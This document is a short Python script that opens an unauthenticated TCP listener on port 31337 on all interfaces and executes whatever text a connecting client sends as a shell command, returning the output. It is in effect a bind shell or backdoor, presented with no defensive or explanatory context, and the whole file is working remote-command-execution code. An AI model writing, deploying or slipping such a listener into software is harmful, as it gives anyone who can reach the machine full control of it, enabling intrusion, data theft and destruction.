import subprocess

import socket
import threading

class ThreadedServer(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(75)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target=self.listenToClient,args= (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                command = client.recv(size)
                if command:
                    if command == b'exit':
                        client.send(b'exit')
                        raise error('Client disconnected')
                    else:
                        proc = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output = proc.stdout.read()+proc.stderr.read()
                        client.send(output)
                else:
                    raise error('Client disconnected')
            except Exception as e:
                client.close()
                return False

if __name__ == "__main__":
    host = ''
    port = 31337
    ThreadedServer(host,port).listen()
